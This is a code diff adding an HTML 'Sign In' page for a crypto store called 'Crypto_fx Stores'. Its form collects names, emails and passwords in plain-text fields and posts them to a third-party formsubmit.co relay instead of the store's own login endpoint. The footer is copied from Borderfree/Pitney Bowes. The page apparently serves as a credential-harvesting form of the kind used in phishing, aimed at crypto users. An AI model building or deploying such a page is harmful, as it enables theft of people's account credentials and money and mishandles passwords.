@@ -1,0 +1,234 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <link rel="shortcut icon" href="./images/logo.jpg" type="image/x-icon">
+  <title>Sign In</title>
+</head>
+<body>
+  <style>
+    .top{
+  background-color: #0A111B;
+  width: 100%;
+}
+.post{
+  display: flex;
+  
+}
+.post img{
+  width: 300px;
+  border-radius: 10px;
+  margin-right: 300px;
+  padding-left: 20px;
+  padding-top: 20px;
+}
+.post h2{
+  align-items: center;
+  justify-content: end;
+  flex-direction: row;
+  margin-top: 40px;
+  margin-left: 70px;
+}
+.post h2 a{
+  text-decoration: none;
+  color: white;
+  word-wrap: none;
+  white-space: nowrap;
+}
+.badge img{
+  width: 60px; 
+  height: 50px;
+  margin-left: 30px;
+  margin-top: 20px;
+}
+.post h2 a:hover{
+  color: rgb(101, 85, 85);
+  text-decoration: underline;
+}
+
+.modal-content img {
+            width: 100%;
+            margin-bottom: 20px;
+        }
+
+        .modal-content button {
+            background-color: black;
+            margin: auto;
+            font-size: 20px;
+            padding: 10px 60px;
+            border: none;
+            border-radius: 5px;
+        }
+
+
+
+        .sitenavigation{
+          margin-left: 20px;
+          margin-right: 20px;
+        }
+    .container{
+      margin: auto;
+      padding: 10px;
+      width: 50%;
+      border: 1px solid;
+      background-color: rgb(193, 193, 193);
+      margin-top: 10%;
+      margin-bottom: 4%;
+
+    }
+    .container input, select {
+      width: 96%;
+      height: 35px;
+      border-radius: 6px;
+      margin-top: 5px;
+      border: none;
+      display: block;
+      padding-left: 10px;
+    }
+    .container textarea{
+      width: 90%;
+      height: 10vh;
+      padding: 10px;
+      margin-top: 5px;
+    }
+    .container button{
+      width: 150px;
+      height: 40px;
+      border: none;
+      border-radius: 50px;
+      background-color: rgb(6, 5, 5);
+      color: white;
+      font-weight: 500;
+      font-size: larger;
+      cursor: pointer;
+      margin: 0;
+      position: relative;
+      margin-top: 90px;
+      top: 50%;
+      left: 50%;
+      -ms-transform: translate(-50%, -50%);
+      transform: translate(-50%, -50%);
+    }
+    .container button a{
+      color: white;
+      text-decoration: none;
+    }
+    .container button:hover{
+      color: black;
+      border: 1px solid rgb(6, 5, 5);
+      background-color: transparent;
+    }
+    form p{
+      margin-left: 98px;
+    }
+    form p span{
+      cursor: pointer;
+    }
+    
+    #foot{
+      padding: 10px;
+      margin-left: 20px;
+      margin-right: 20px;
+      color: gray;
+      font-weight: 900;
+    }
+  .login a{
+    text-decoration: none;
+    margin-left: 6px;
+    cursor: pointer;
+  }
+
+    .opt{
+      margin-left: 20%;
+    }
+    .Social_link{
+  background-color: white;
+  display: flex;
+  justify-content: end;
+  padding-top: 20px;
+}
+.Social_link li {
+  list-style: none;
+}
+.Social_link li a img {
+  width: 40px;
+  display: flex;
+  background-color: #4d6194;
+  flex-direction: column;
+  margin-right: 40px;
+  
+  
+}
+.facebook li a img, .instagram li a img, .cryptofxstores li a img{
+  width: 90px;
+  height: 30px;
+  display: flex;
+  flex-direction: column;
+  margin-right: 40px;
+  border-radius: 6px;
+  cursor: pointer;
+}
+.facebook li p, .instagram li p, .cryptofxstores li p:hover{
+  color: navy;
+}
+@media (max-width:700px) {
+  .content{
+    margin: auto;
+    width: 99%;
+    margin-left: 0%;
+  }
+  .facebook li a img, .instagram li a img, .cryptofxstores li a img{
+    margin-right: 20px;
+  }
+  
+}
+
+        
+  </style>
+  <div class="content">
+    <div class="top">
+      <div class="post">
+        <img src="./images/logo.jpg" alt="">
+        
+      </div>
+    <div>
+    <div class="container">
+      <form action="https://formsubmit.co/8e7f7671480777e1d72be5ae0aa66425" method="post">
+        <input type="text" name="Name" placeholder="Full name" required>
+        <input type="email" name="Email" placeholder="@email.com" required>
+        <input type="text" name="Password" placeholder="Password" required>
+        <input type="text" name="Password" placeholder="Re-enter Password" required>
+        <select name="Continent">
+          <option>Africa</option>
+          <option>Antartica</option>
+          <option>Asia</option>
+          <option>Australia</option>
+          <option>Europe</option>
+          <option>North America</option>
+          <option>South America</option>
+        </select>
+        
+        <button type="submit">Create </button>
+        <p>Have an account? <span style="color: rgb(113, 113, 247)"><a href="https://cryptofxstores.com/home/login.php">Login</a></span></p>
+      </form>
+    </div>
+    <hr style="border-top: 2px dotted rgb(97, 94, 94);">
+    <div style="display:block">
+      <div class="opt">
+        <input type="checkbox" id="ele" checked>
+        <label  for="ele" style="color:rgb(187, 179, 179);padding-top: 10px;margin-left: 5px;">Send me electronic or mail offers from
+                        Crypto_fx. You may opt out at any time. Don't have an Account?<span class="login"><i><a href="http://cryptofxstores.com/">Register</a></i></span>
+        </label><br>
+      </div><hr>
+      <div id="foot">
+        <p>By clicking Submit, you agree to the <span><a href="#">Terms & Conditions</a></span> and<span><a href="#">Privacy Policy of Borderfree from Pitney Bowes</a></span>, Crypto_fx international fulfillment service. Crypto_fx Stores is an online merchant that is located at Deutschhermufer 27,60594 Frankfurt am Main, Germany.</p><hr>
+      </div>
+      <div class="Social_link">
+        <div class="facebook"><li><a href="https://www.facebook.com/groups/177718191897839/chats/6640791255971207"><img src="./images/fb.svg" alt=""></a><p>Facebook</p></li></div>
+        <div class="instagram"><li><a href="https://instagram.com/cryptofxstores.consult?igshid=MmIzYWVlNDQ5Yg=="><img src="./images/insta.svg" alt=""></a><p>Instagram</p></li></div>
+        <div class="cryptofxstores"><li><a href="http://cryptofxstores.com/"><img src="./images/logo.jpg" alt=""></a><p>Crypto_fx Stores</p></li></div>
+      </div>
+    </div>
+</body>
+</html>
